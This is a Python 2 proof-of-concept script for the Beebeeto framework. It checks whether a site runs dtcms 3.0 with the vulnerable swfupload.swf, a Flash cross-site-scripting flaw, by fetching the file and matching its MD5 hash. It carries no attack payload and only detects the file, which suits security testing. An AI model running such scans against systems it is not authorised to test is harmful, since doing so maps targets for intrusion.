#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0124',
            'name': 'dtcms 3.0 /scripts/swfupload/swfupload.swf 跨站脚本漏洞 POC',
            'author': '大孩小孩',
            'create_date': '2014-10-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'dtcms',
            'vul_version': ['3.0'],
            'type': 'Cross Site Scripting',
            'tag': ['dtcms漏洞', 'xss', '/scripts/swfupload/swfupload.swf'],
            'desc': 'dtcms 3.0 /scripts/swfupload/swfupload.swf文件存在FlashXss漏洞。',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-069817',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
        verify_url = args['options']['target'] + "/scripts/swfupload/swfupload.swf"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        md5_value = md5.new(content).hexdigest()
        if md5_value in flash_md5:
            args['success'] = True
            args['poc_ret']['xss_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())